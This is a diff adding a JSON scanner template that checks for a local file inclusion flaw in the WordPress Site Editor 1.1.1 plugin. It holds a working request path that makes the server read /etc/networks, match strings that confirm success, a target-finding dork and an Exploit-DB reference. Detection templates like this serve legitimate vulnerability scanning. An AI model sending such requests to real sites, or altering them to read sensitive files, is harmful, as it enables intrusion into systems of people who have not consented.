@@ -1,0 +1,18 @@
+{
+    "name": "Wordpress_SiteEditor_1.1.1_Plugin_Local_File_Inclusion",
+    "method": "GET",
+    "port": [
+        80
+    ],
+    "dork": "apps=WordPress",
+    "suffix": [
+        "/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/networks"
+    ],
+    "hits": [
+        "loopback",
+        "link-local"
+    ],
+    "references": [
+        "https://www.exploit-db.com/exploits/44340/"
+    ]
+}
